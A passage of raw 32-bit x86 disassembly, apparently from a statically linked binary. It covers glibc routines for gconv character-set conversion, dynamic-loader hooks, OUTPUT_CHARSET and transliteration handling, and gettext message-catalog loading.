mov ebx, dword [esp]
leave
ret
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov dword [esi + 0xc], 0
mov eax, dword [esi + 4]
lea ecx, [esi + 0xc]
mov dword [var_10h], 0
mov dword [var_ch], 2
mov dword [var_sp_8h], 0
mov dword [var_sp_4h], 0
mov edx, dword [esi]
lea ebx, [edx + 0x1b8]
mov dword [esp], ebx
call fcn.0807e450
mov dword [esi + 8], eax
sub esp, 0x14
mov esi, dword [var_4h]
mov ebx, dword [var_8h]
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
leave
jmp fcn.08055790
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x2c
mov dword [var_4h], esi
lea edx, [var_18h]
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov dword [var_18h], str.GLIBC_PRIVATE
mov dword [var_ch], 0
mov dword [var_10h], 1
mov dword [var_14h], 0x963cf85
mov dword [esi + 0xc], 0
mov eax, dword [esi + 4]
lea ecx, [esi + 0xc]
mov dword [var_sp_10h], 0
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], 0
mov dword [var_sp_4h], edx
mov edx, dword [esi]
mov ebx, dword [edx + 0x1b4]
mov dword [esp], ebx
call fcn.0807e450
mov dword [esi + 8], eax
sub esp, 0x14
mov esi, dword [var_4h]
mov ebx, dword [var_8h]
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x20
mov eax, dword [arg_8h]
lea edx, [var_10h]
mov dword [var_10h], eax
mov eax, dword [arg_ch]
mov dword [var_ch], eax
mov eax, 0x80835d0
call fcn.08083580
xor edx, edx
test eax, eax
jne 0x808373f
mov eax, dword [var_8h]
lea edx, [var_20h]
mov dword [var_1ch], str._dl_open_hook
mov dword [var_20h], eax
mov eax, fcn.08083660
call fcn.08083580
test eax, eax
jne 0x808373c
mov edx, dword [var_18h]
test edx, edx
je 0x8083743
mov eax, dword [var_14h]
mov eax, dword [eax + 4]
add eax, dword [edx]
test eax, eax
je 0x808373c
mov dword [eax], 0x80a9c14
mov edx, dword [var_8h]
mov eax, edx
leave
ret
mov eax, dword [var_14h]
mov eax, dword [eax + 4]
jmp 0x8083732
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_8h]
lea edx, [var_10h]
mov dword [var_10h], eax
mov eax, dword [arg_ch]
mov dword [var_ch], eax
mov eax, fcn.080835f0
call fcn.08083580
xor edx, edx
test eax, eax
jne 0x8083784
mov ecx, dword [var_8h]
test ecx, ecx
je 0x8083788
mov eax, dword [var_4h]
mov edx, dword [eax + 4]
add edx, dword [ecx]
mov eax, edx
leave
ret
mov eax, dword [var_4h]
mov edx, dword [eax + 4]
jmp 0x8083784
push ebp
mov eax, fcn.08083650
mov ebp, esp
mov edx, dword [arg_8h]
leave
jmp fcn.08083580
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0x80aaa40
mov ebp, esp
leave
ret
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x50
mov dword [var_3ch], 0
mov dword [var_38h], 0
mov dword [var_20h], eax
mov dword [var_24h], edx
mov dword [var_28h], ecx
mov dword [var_2ch], 0
mov dword [var_30h], 0
mov dword [var_4h], 0x2f
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
je 0x8083826
lea eax, [eax + 1]
mov dword [var_4h], 0x2f
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
mov ebx, eax
je 0x8083826
inc ebx
cmp byte [eax + 1], 0
jne 0x8083c59
mov eax, dword [var_24h]
mov dword [var_4h], 0x2f
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
je 0x808385f
inc eax
mov dword [var_4h], 0x2f
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
je 0x808385f
cmp byte [eax + 1], 0
lea edx, [eax + 1]
jne 0x8083c26
mov eax, dword [var_20h]
cmp byte [eax], 0x2f
jne 0x80838c4
cmp byte [eax + 1], 0x2f
jne 0x80838c4
cmp byte [eax + 2], 0
jne 0x80838c4
mov eax, 0
test eax, eax
je 0x8083c1c
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ebx, dword [eax + 0x5c]
mov dword [esp], ebx
call fcn.08053400
lea edx, [eax + 0x15]
and edx, 0xfffffffc
sub esp, edx
lea edx, [var_1bh]
mov dword [var_8h_2], eax
mov dword [var_4h], ebx
and edx, 0xfffffff0
mov dword [var_20h], edx
mov dword [esp], edx
call fcn.08053740
mov word [eax], 0x2f2f
mov byte [eax + 2], 0
mov ecx, dword [var_24h]
cmp byte [ecx], 0x2f
jne 0x8083929
cmp byte [ecx + 1], 0x2f
jne 0x8083929
cmp byte [ecx + 2], 0
jne 0x8083929
mov eax, 0
test eax, eax
je 0x8083c12
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ebx, dword [eax + 0x5c]
mov dword [esp], ebx
call fcn.08053400
lea edx, [eax + 0x15]
and edx, 0xfffffffc
sub esp, edx
lea edx, [var_1bh]
mov dword [var_8h_2], eax
mov dword [var_4h], ebx
and edx, 0xfffffff0
mov dword [var_24h], edx
mov dword [esp], edx
call fcn.08053740
mov word [eax], 0x2f2f
mov byte [eax + 2], 0
mov eax, dword [arg_8h]
mov edx, dword [var_24h]
lea ecx, [var_18h]
mov dword [var_4h], eax
lea eax, [var_14h]
mov dword [esp], eax
mov eax, dword [var_20h]
call fcn.08056f50
sub esp, 8
mov dword [var_34h], eax
test eax, eax
jne 0x8083b29
mov edi, dword [var_3ch]
xor ebx, ebx
test edi, edi
je 0x8083975
nop
lea esi, [esi]
mov eax, dword [edi]
test eax, eax
jne 0x8083be4
mov eax, dword [edi + 4]
mov ebx, edi
test eax, eax
mov edi, eax
jne 0x8083960
mov eax, dword [var_14h]
lea eax, [eax + eax*8]
lea eax, [eax*4 + 8]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [var_2ch], eax
je 0x8083b49
mov eax, dword [var_18h]
mov ecx, dword [var_2ch]
cld
mov dword [ecx + 4], eax
mov eax, dword [var_2ch]
mov ecx, dword [var_14h]
mov dword [eax], ecx
mov edi, eax
lea ecx, [ecx + ecx*8]
shl ecx, 2
add edi, 8
xor eax, eax
shr ecx, 2
rep stosd dword es:[edi], eax
mov dword [var_30h], 0
mov edx, dword [var_14h]
cmp eax, edx
jae 0x8083a99
mov ecx, dword [var_2ch]
mov dword [var_50h], 0
mov dword [var_4ch], ecx
mov eax, dword [var_4ch]
mov edi, dword [var_3ch]
mov ecx, dword [var_4ch]
add eax, 0x20
test edi, edi
mov dword [ecx + 0x1c], eax
je 0x8083a39
mov dword [var_44h], ecx
mov esi, esi
xor ebx, ebx
cmp ebx, dword [edi + 0xc]
jae 0x8083a2f
mov esi, dword [var_50h]
lea esi, [esi]
mov dword [var_8h], 0x80a99c0
mov eax, dword [edi + 8]
mov eax, dword [eax + ebx*4]
mov dword [var_4h_2], eax
mov eax, dword [var_18h]
mov eax, dword [eax + esi + 0xc]
mov dword [esp], eax
call fcn.0808dcc0
test eax, eax
je 0x8083b67
inc ebx
cmp ebx, dword [edi + 0xc]
jb 0x8083a00
mov edi, dword [edi + 4]
test edi, edi
jne 0x80839f0
mov edx, dword [var_14h]
lea eax, [edx - 1]
cmp dword [var_30h], eax
jae 0x8083b55
mov ecx, dword [var_38h]
mov edx, dword [var_4ch]
mov eax, dword [var_18h]
mov dword [edx + 0x10], ecx
mov edx, dword [var_50h]
mov eax, dword [eax + edx + 0x30]
mov ebx, eax
shl ebx, 8
sub ebx, eax
shl ebx, 5
mov dword [esp], ebx
call fcn.08050fe0
mov ecx, dword [var_4ch]
test eax, eax
mov dword [ecx + 8], eax
je 0x8083b49
mov ecx, dword [var_4ch]
add eax, ebx
inc dword [var_30h]
add dword [var_50h], 0x3c
mov edx, dword [var_14h]
mov dword [ecx + 0xc], eax
add ecx, 0x24
cmp dword [var_30h], edx
mov dword [var_4ch], ecx
jb 0x80839d8
mov ecx, dword [var_34h]
test ecx, ecx
je 0x8083b29
call fcn.08048b20
mov edx, dword [var_2ch]
mov eax, dword [eax]
test edx, edx
mov dword [var_48h], eax
je 0x8083b14
mov eax, dword [var_30h]
dec dword [var_30h]
test eax, eax
je 0x8083b02
mov edx, dword [var_30h]
mov ecx, dword [var_2ch]
lea eax, [edx + edx*8]
lea esi, [ecx + eax*4 + 8]
mov edi, dword [esi + 0x20]
test edi, edi
je 0x8083aeb
mov ebx, edi
mov edi, dword [edi + 0x10]
mov eax, dword [ebx + 8]
test eax, eax
jne 0x8083b3e
mov dword [esp], ebx
call fcn.08051180
test edi, edi
jne 0x8083ad3
mov eax, dword [esi]
mov ebx, dword [var_30h]
sub esi, 0x24
mov dword [esp], eax
call fcn.08051180
dec dword [var_30h]
test ebx, ebx
jne 0x8083acc
mov eax, dword [var_2ch]
mov dword [esp], eax
call fcn.08051180
mov dword [var_2ch], 0
mov edx, dword [var_14h]
mov eax, dword [var_18h]
call fcn.08057110
call fcn.08048b20
mov edx, dword [var_48h]
mov dword [eax], edx
mov eax, dword [var_2ch]
mov ecx, dword [var_28h]
mov dword [ecx], eax
mov eax, dword [var_34h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 4
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 8]
jmp 0x8083adf
mov dword [var_34h], 3
jmp 0x8083aa4
or dword [var_38h], 1
mov eax, dword [var_4ch]
mov edx, dword [var_38h]
mov dword [eax + 0x10], edx
jmp 0x8083a99
mov eax, dword [edi + 0x18]
mov dword [var_1ch], 0
test eax, eax
je 0x8083b91
mov eax, dword [var_18h]
mov eax, dword [eax + esi + 0x10]
mov dword [var_4h_2], eax
lea eax, [var_1ch]
mov dword [esp], eax
call dword [edi + 0x18]
test eax, eax
jne 0x8083a2f
mov dword [esp], 0x14
call fcn.08050fe0
test eax, eax
mov ecx, eax
je 0x8083b49
mov eax, dword [edi + 0x10]
mov dword [ecx + 0x10], 0
mov edx, dword [var_44h]
mov dword [ecx], eax
add edx, 0x28
mov eax, dword [edi + 0x14]
mov dword [ecx + 4], eax
mov eax, dword [edi + 0x1c]
mov dword [ecx + 8], eax
mov eax, dword [var_1ch]
mov dword [ecx + 0xc], eax
mov eax, dword [var_44h]
mov esi, dword [eax + 0x28]
test esi, esi
je 0x8083bdd
mov eax, dword [edx]
mov ebx, dword [eax + 0x10]
lea edx, [eax + 0x10]
test ebx, ebx
jne 0x8083bd1
mov dword [edx], ecx
jmp 0x8083a2f
mov eax, edi
call fcn.080846b0
test eax, eax
je 0x808396a
test ebx, ebx
je 0x8083c05
mov eax, dword [edi + 4]
mov dword [ebx + 4], eax
mov eax, dword [edi + 4]
jmp 0x808396f
mov edi, dword [edi + 4]
mov eax, edi
mov dword [var_3ch], edi
jmp 0x808396f
mov eax, dword [0x80a9ab4]
jmp 0x80838f1
mov eax, dword [0x80a9ab4]
jmp 0x808388c
mov eax, edx
sub eax, dword [var_24h]
lea edx, [eax + 0x13]
and edx, 0xfffffffc
sub esp, edx
lea edx, [var_1bh]
and edx, 0xfffffff0
mov byte [eax + edx], 0
mov dword [esp], edx
mov ecx, dword [var_24h]
mov dword [var_8h_2], eax
mov dword [var_4h], ecx
call fcn.08053770
mov dword [var_24h], eax
jmp 0x808385f
mov edx, ebx
sub edx, dword [var_20h]
lea eax, [edx + 0x13]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1bh]
and eax, 0xfffffff0
mov byte [edx + eax], 0
mov dword [esp], eax
mov dword [var_8h_2], edx
mov edx, dword [var_20h]
mov dword [var_4h], edx
call fcn.08053770
mov dword [esp], ebx
mov dword [var_20h], eax
call fcn.08053400
lea edx, [eax + 1]
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1bh]
mov dword [var_8h_2], edx
mov dword [var_4h], ebx
and eax, 0xfffffff0
mov dword [esp], eax
call fcn.08053770
test eax, eax
mov edx, eax
cmove edx, dword [var_10h]
movzx eax, byte [edx]
cmp al, 0x2c
je 0x8083e55
xor ecx, ecx
test al, al
je 0x8083ce9
mov eax, edx
inc edx
mov ecx, eax
movzx eax, byte [edx]
test al, al
je 0x8083ce6
inc edx
cmp al, 0x2c
je 0x8083e4c
movzx eax, byte [edx]
test al, al
jne 0x8083cd6
mov dword [var_10h], edx
test ecx, ecx
mov esi, ecx
je 0x8083826
mov dword [var_8h_2], 0x80a99c0
mov dword [var_4h], 0x8092de3
mov dword [esp], esi
call fcn.0808dcc0
test eax, eax
jne 0x8083dbe
mov eax, dword [var_3ch]
xor ebx, ebx
test eax, eax
je 0x8083d36
lea esi, [esi]
cmp dword [eax + 0x10], 0x8084100
je 0x8083db5
mov ebx, eax
mov eax, dword [eax + 4]
test eax, eax
jne 0x8083d20
sub esp, 0x30
mov ecx, 8
lea edx, [var_1bh_2]
and edx, 0xfffffff0
test ebx, ebx
cld
mov edi, edx
rep stosd dword es:[edi], eax
mov dword [edx + 8], 0x80a9c24
mov dword [edx + 0xc], 1
mov dword [edx + 0x10], 0x8084100
je 0x8083db0
mov dword [ebx + 4], edx
mov edx, dword [var_10h]
movzx eax, byte [edx]
cmp al, 0x2c
je 0x8083da6
xor ecx, ecx
test al, al
je 0x8083d91
mov eax, edx
inc edx
mov ecx, eax
movzx eax, byte [edx]
test al, al
je 0x8083d8e
inc edx
cmp al, 0x2c
je 0x8083da0
movzx eax, byte [edx]
test al, al
jne 0x8083d82
mov dword [var_10h], edx
test ecx, ecx
mov esi, ecx
jne 0x8083cf3
jmp 0x8083826
mov byte [edx - 1], 0
jmp 0x8083d8e
inc edx
movzx eax, byte [edx]
cmp al, 0x2c
je 0x8083da6
jmp 0x8083d70
mov dword [var_3ch], edx
jmp 0x8083d66
test eax, eax
jne 0x8083d66
jmp 0x8083d36
mov dword [var_8h_2], 0x80a99c0
mov dword [var_4h], str.IGNORE
mov dword [esp], esi
call fcn.0808dcc0
test eax, eax
jne 0x8083de0
or dword [var_38h], 2
jmp 0x8083d66
mov ebx, dword [var_3ch]
mov dword [var_40h], 0
test ebx, ebx
je 0x8083dfe
mov eax, dword [ebx]
test eax, eax
jne 0x8083e28
mov dword [var_40h], ebx
mov ebx, dword [ebx + 4]
test ebx, ebx
jne 0x8083dee
sub esp, 0x30
mov eax, ebx
mov ecx, 8
lea edx, [var_1bh_2]
and edx, 0xfffffff0
cld
mov edi, edx
rep stosd dword es:[edi], eax
mov dword [edx], esi
mov eax, dword [var_40h]
test eax, eax
je 0x8083db0
mov ecx, dword [var_40h]
mov dword [ecx + 4], edx
jmp 0x8083d66
mov dword [var_8h_2], 0x80a99c0
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.0808dcc0
test eax, eax
jne 0x8083df4
test ebx, ebx
jne 0x8083d66
jmp 0x8083dfe
mov byte [edx - 1], 0
jmp 0x8083ce6
inc edx
movzx eax, byte [edx]
cmp al, 0x2c
je 0x8083e55
jmp 0x8083cc4
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
mov eax, 8
push ebx
sub esp, 0x34
cmp edi, 0xffffffff
mov dword [var_14h], ecx
mov dword [var_10h], edx
je 0x8083f6c
mov eax, dword [edi]
mov ebx, dword [arg_10h]
dec eax
test ebx, ebx
mov dword [var_18h], eax
je 0x8084033
mov ecx, dword [var_18h]
mov edx, dword [arg_10h]
lea eax, [ecx + ecx*8]
mov dword [edx], 0
mov ecx, dword [arg_8h]
xor edx, edx
lea eax, [edi + eax*4 + 8]
test ecx, ecx
je 0x8083ed1
mov ecx, dword [arg_8h]
mov edx, dword [ecx]
mov dword [eax], edx
mov edx, dword [var_18h]
lea eax, [edx + edx*8]
lea esi, [edi + eax*4]
mov eax, dword [arg_ch]
mov dword [esi + 0xc], eax
mov eax, dword [var_10h]
test eax, eax
je 0x8083ef6
mov eax, dword [var_10h]
mov ecx, dword [eax]
test ecx, ecx
jne 0x8083f76
mov eax, dword [edi + 4]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
mov dword [var_1ch], 0
xor eax, eax
mov ebx, dword [edi + 4]
cmp dword [esi + 8], 0
mov edx, dword [arg_10h]
mov dword [var_8h], 0
sete al
mov dword [var_sp_10h], 0
mov dword [var_ch], 0
mov dword [esp], ebx
mov dword [var_sp_14h], edx
inc eax
mov dword [var_sp_18h], eax
lea eax, [edi + 8]
mov dword [var_4h], eax
call dword [ebx + 0x14]
mov esi, eax
mov edx, dword [arg_8h]
test edx, edx
je 0x8083f6a
mov eax, dword [arg_8h]
mov eax, dword [eax]
test eax, eax
je 0x8083f6a
mov edx, dword [var_18h]
mov ecx, dword [arg_8h]
lea eax, [edx + edx*8]
mov eax, dword [edi + eax*4 + 8]
mov dword [ecx], eax
mov eax, esi
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret 0xc
mov esi, dword [arg_8h]
test esi, esi
je 0x808400f
mov eax, dword [arg_8h]
mov ebx, dword [eax]
test ebx, ebx
je 0x808400f
lea edx, [edi + 8]
mov ebx, dword [edi + 4]
mov dword [var_20h], edx
mov eax, dword [ebx + 0x14]
mov dword [var_bp_1ch], ecx
mov dword [esp], eax
call fcn.08083520
mov ecx, dword [arg_10h]
mov edx, dword [var_14h]
mov dword [var_1ch], 0
mov eax, dword [edi + 4]
mov dword [var_sp_18h], 0
mov dword [var_sp_10h], 0
mov dword [var_sp_14h], ecx
mov dword [var_ch], edx
mov ecx, dword [var_10h]
mov edx, dword [var_20h]
mov dword [esp], eax
mov dword [var_8h], ecx
mov dword [var_4h], edx
call dword [eax + 0x14]
cmp eax, 4
mov esi, eax
jne 0x8083f4b
mov ecx, dword [var_10h]
mov edx, dword [ecx]
cmp dword [var_bp_1ch], edx
mov ecx, edx
je 0x8083f4b
mov eax, dword [edi + 4]
add edx, dword [eax + 0x24]
mov ebx, eax
cmp edx, dword [var_14h]
jbe 0x8083f97
jmp 0x8083f4b
mov dword [var_ch], str.__gconv
mov dword [var_8h], 0x3a
mov dword [var_4h], str.gconv.c
mov dword [esp], str.outbuf_____void__0___outbuf_____void__0_
call fcn.0805efc0
mov dword [var_ch], str.__gconv
mov dword [var_8h], 0x2a
mov dword [var_4h], str.gconv.c
mov dword [esp], str.irreversible_____void__0_
jmp 0x808402e
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov dword [var_10h], eax
mov edi, dword [var_10h]
mov eax, dword [eax + 4]
add edi, 8
mov dword [var_14h], eax
mov eax, dword [var_10h]
mov eax, dword [eax]
mov dword [var_18h], eax
mov esi, dword [edi + 0x20]
test esi, esi
je 0x808409f
mov ebx, esi
mov esi, dword [esi + 0x10]
mov eax, dword [ebx + 8]
test eax, eax
jne 0x80840dd
mov dword [esp], ebx
call fcn.08051180
test esi, esi
jne 0x8084087
mov eax, dword [edi + 8]
test al, 1
jne 0x80840ac
mov edx, dword [edi]
test edx, edx
jne 0x80840d0
add edi, 0x24
test al, 1
je 0x8084080
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08051180
mov edx, dword [var_18h]
mov eax, dword [var_14h]
add esp, 0x10
pop ebx
pop esi
pop edi
leave
jmp fcn.08057110
mov dword [esp], edx
call fcn.08051180
mov eax, dword [edi + 8]
jmp 0x80840ac
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 8]
jmp 0x8084093
push ebp
mov ebp, esp
push edi
push esi
mov esi, eax
xor eax, eax
push ebx
mov ebx, ecx
sub esp, 0x28
test ecx, ecx
mov dword [var_14h], edx
je 0x8060459
mov eax, dword [ecx + 8]
mov edx, dword [var_14h]
mov ecx, 0x80a4f11
mov dword [edx + 0x38], eax
mov dword [edx + 0x3c], 0xffffffff
mov dword [edx + 0x40], 0
lea eax, [var_10h]
mov edx, ebx
mov dword [esp], eax
mov eax, esi
call fcn.0805f920
sub esp, 4
mov dword [var_18h], eax
test eax, eax
je 0x8060670
mov dword [var_4h], str.charset
mov dword [esp], eax
call fcn.080535c0
test eax, eax
mov edx, eax
je 0x8060670
add edx, 8
xor ecx, ecx
movzx eax, byte [edx]
test al, al
je 0x80604e2
movsx eax, al
cmp eax, 0x20
je 0x80604e2
cmp eax, 9
je 0x80604e2
cmp eax, 0xa
je 0x80604e2
inc ecx
movzx eax, byte [ecx + edx]
test al, al
je 0x80604e2
movsx eax, al
cmp eax, 0x20
je 0x80604e2
cmp eax, 9
je 0x80604e2
cmp eax, 0xa
jne 0x80604c7
lea eax, [ecx + 0x13]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1bh]
mov dword [var_8h], ecx
mov dword [var_4h], edx
and eax, 0xfffffff0
mov dword [var_1ch], eax
mov dword [esp], eax
call fcn.08053740
test ebx, ebx
mov byte [eax], 0
je 0x8060514
mov eax, dword [ebx + 0xc]
test eax, eax
mov ecx, eax
jne 0x806054e
mov dword [esp], str.OUTPUT_CHARSET
call fcn.080631c0
test eax, eax
mov ecx, eax
je 0x8060530
movzx eax, byte [eax]
test al, al
mov byte [var_25h], al
jne 0x8060554
mov eax, 0
test eax, eax
je 0x806067b
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ecx, dword [eax + 0x5c]
movzx edx, byte [ecx]
mov byte [var_25h], dl
xor edi, edi
mov ebx, ecx
cmp byte [var_25h], 0
je 0x8060572
movzx edx, byte [ecx]
inc ebx
lea eax, [edi + 1]
cmp dl, 0x2f
movzx edx, byte [ebx]
cmove edi, eax
test dl, dl
jne 0x8060561
sub ebx, ecx
lea eax, [ebx + 0x1d]
mov ebx, ecx
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1bh]
and eax, 0xfffffff0
cmp byte [var_25h], 0
mov dword [var_20h], eax
mov esi, eax
je 0x80605ad
movzx edx, byte [ecx]
mov eax, dword [0x80a99fc]
movsx edx, dl
mov ecx, esi
inc ebx
inc esi
mov eax, dword [eax + edx*4]
mov byte [ecx], al
movzx eax, byte [ebx]
test al, al
mov edx, eax
jne 0x8060593
cmp edi, 1
ja 0x80605d0
mov byte [esi], 0x2f
inc esi
test edi, edi
jne 0x80605d0
mov byte [esi], 0x2f
inc esi
mov dword [esi], 0x4e415254
mov dword [esi + 4], 0x54494c53
add esi, 8
mov esi, esi
mov byte [esi], 0
xor edi, edi
mov ebx, dword [var_1ch]
movzx ecx, byte [ebx]
test cl, cl
je 0x80605f2
mov edx, ecx
inc ebx
lea eax, [edi + 1]
cmp dl, 0x2f
movzx edx, byte [ebx]
cmove edi, eax
test dl, dl
jne 0x80605e1
sub ebx, dword [var_1ch]
lea eax, [ebx + 0x15]
mov ebx, dword [var_1ch]
and eax, 0xfffffffc
sub esp, eax
lea edx, [var_1bh]
and edx, 0xfffffff0
test cl, cl
mov dword [var_24h], edx
mov esi, edx
je 0x806062d
movzx edx, byte [ebx]
mov eax, dword [0x80a99fc]
movsx edx, dl
mov ecx, esi
inc ebx
inc esi
mov eax, dword [eax + edx*4]
mov byte [ecx], al
movzx eax, byte [ebx]
test al, al
mov edx, eax
jne 0x8060613
cmp edi, 1
ja 0x8060640
mov byte [esi], 0x2f
inc esi
test edi, edi
jne 0x8060640
mov byte [esi], 0x2f
inc esi
mov esi, esi
mov byte [esi], 0
mov eax, dword [var_20h]
mov edx, dword [var_24h]
mov ecx, dword [var_14h]
mov dword [esp], 1
add ecx, 0x3c
call fcn.080837c0
sub esp, 4
test eax, eax
je 0x8060670
mov eax, dword [var_14h]
mov dword [eax + 0x3c], 0xffffffff
lea esi, [esi]
mov eax, dword [var_18h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x8060549
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
mov eax, 8
push ebx
sub esp, 0x34
cmp edi, 0xffffffff
mov dword [var_14h], ecx
mov dword [var_10h], edx
je 0x8083f6c
mov eax, dword [edi]
mov ebx, dword [arg_10h]
dec eax
test ebx, ebx
mov dword [var_18h], eax
je 0x8084033
mov ecx, dword [var_18h]
mov edx, dword [arg_10h]
lea eax, [ecx + ecx*8]
mov dword [edx], 0
mov ecx, dword [arg_8h]
xor edx, edx
lea eax, [edi + eax*4 + 8]
test ecx, ecx
je 0x8083ed1
mov ecx, dword [arg_8h]
mov edx, dword [ecx]
mov dword [eax], edx
mov edx, dword [var_18h]
lea eax, [edx + edx*8]
lea esi, [edi + eax*4]
mov eax, dword [arg_ch]
mov dword [esi + 0xc], eax
mov eax, dword [var_10h]
test eax, eax
je 0x8083ef6
mov eax, dword [var_10h]
mov ecx, dword [eax]
test ecx, ecx
jne 0x8083f76
mov eax, dword [edi + 4]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
mov dword [var_1ch], 0
xor eax, eax
mov ebx, dword [edi + 4]
cmp dword [esi + 8], 0
mov edx, dword [arg_10h]
mov dword [var_8h], 0
sete al
mov dword [var_sp_10h], 0
mov dword [var_ch], 0
mov dword [esp], ebx
mov dword [var_sp_14h], edx
inc eax
mov dword [var_sp_18h], eax
lea eax, [edi + 8]
mov dword [var_4h], eax
call dword [ebx + 0x14]
mov esi, eax
mov edx, dword [arg_8h]
test edx, edx
je 0x8083f6a
mov eax, dword [arg_8h]
mov eax, dword [eax]
test eax, eax
je 0x8083f6a
mov edx, dword [var_18h]
mov ecx, dword [arg_8h]
lea eax, [edx + edx*8]
mov eax, dword [edi + eax*4 + 8]
mov dword [ecx], eax
mov eax, esi
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret 0xc
mov esi, dword [arg_8h]
test esi, esi
je 0x808400f
mov eax, dword [arg_8h]
mov ebx, dword [eax]
test ebx, ebx
je 0x808400f
lea edx, [edi + 8]
mov ebx, dword [edi + 4]
mov dword [var_20h], edx
mov eax, dword [ebx + 0x14]
mov dword [var_bp_1ch], ecx
mov dword [esp], eax
call fcn.08083520
mov ecx, dword [arg_10h]
mov edx, dword [var_14h]
mov dword [var_1ch], 0
mov eax, dword [edi + 4]
mov dword [var_sp_18h], 0
mov dword [var_sp_10h], 0
mov dword [var_sp_14h], ecx
mov dword [var_ch], edx
mov ecx, dword [var_10h]
mov edx, dword [var_20h]
mov dword [esp], eax
mov dword [var_8h], ecx
mov dword [var_4h], edx
call dword [eax + 0x14]
cmp eax, 4
mov esi, eax
jne 0x8083f4b
mov ecx, dword [var_10h]
mov edx, dword [ecx]
cmp dword [var_bp_1ch], edx
mov ecx, edx
je 0x8083f4b
mov eax, dword [edi + 4]
add edx, dword [eax + 0x24]
mov ebx, eax
cmp edx, dword [var_14h]
jbe 0x8083f97
jmp 0x8083f4b
mov dword [var_ch], str.__gconv
mov dword [var_8h], 0x3a
mov dword [var_4h], str.gconv.c
mov dword [esp], str.outbuf_____void__0___outbuf_____void__0_
call fcn.0805efc0
mov dword [var_ch], str.__gconv
mov dword [var_8h], 0x2a
mov dword [var_4h], str.gconv.c
mov dword [esp], str.irreversible_____void__0_
jmp 0x808402e
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xe4
mov ebx, dword [eax]
mov dword [eax + 8], 0
mov dword [var_78h], eax
mov dword [var_7ch], edx
mov dword [var_88h], 0
mov dword [eax + 4], 1
test ebx, ebx
je 0x8060955
xor ecx, ecx
mov eax, 5
int 0x80
cmp eax, 0xfffff000
mov edi, eax
ja 0x8061465
cmp edi, 0xffffffff
je 0x8060955
lea eax, [var_6ch]
mov dword [var_4h], edi
mov dword [esp], 3
mov dword [var_8h], eax
call fcn.08053dc0
test eax, eax
jne 0x8061457
mov ebx, dword [var_40h]
mov eax, dword [var_40h]
mov edx, dword [var_3ch]
mov dword [var_80h], ebx
xor ebx, ebx
mov ecx, dword [var_80h]
mov esi, ebx
xor esi, edx
xor eax, ecx
or esi, eax
jne 0x8061457
cmp dword [var_80h], 0x2f
jbe 0x8061457
mov eax, dword [var_80h]
mov dword [var_14h], 0
mov dword [var_10h], edi
mov dword [var_sp_ch], 2
mov dword [var_8h], 1
mov dword [esp], 0
mov dword [var_4h], eax
call fcn.080546d0
mov dword [var_84h], eax
inc eax
je 0x80613ad
mov ebx, edi
mov eax, 6
int 0x80
mov dword [var_88h_2], 1
mov edx, dword [var_84h]
mov eax, dword [edx]
cmp eax, 0x950412de
jne 0x8061371
mov dword [esp], 0x4c
call fcn.08050fe0
test eax, eax
mov dword [var_8ch], eax
je 0x8060955
mov edx, dword [var_78h]
mov ebx, dword [var_84h]
mov ecx, eax
mov dword [edx + 8], eax
mov dword [eax], ebx
mov dword [ecx + 0x10], 0
mov eax, dword [var_88h]
mov edx, dword [var_80h]
mov dword [ecx + 4], eax
mov dword [ecx + 8], edx
xor eax, eax
cmp dword [ebx], 0x950412de
setne al
test eax, eax
mov dword [ecx + 0xc], eax
je 0x8061363
mov ebx, dword [ebx + 4]
ror bx, 8
ror ebx, 0x10
ror bx, 8
mov eax, ebx
sar eax, 0x10
cmp eax, 1
ja 0x80611af
mov edx, dword [var_8ch]
mov esi, dword [edx + 0xc]
test esi, esi
mov edx, esi
je 0x8061355
mov ecx, dword [var_84h_2]
mov eax, dword [ecx + 8]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov ecx, dword [var_8ch]
test edx, edx
mov dword [ecx + 0x14], eax
je 0x8061347
mov ecx, dword [var_84h_2]
mov eax, dword [ecx + 0xc]
ror ax, 8
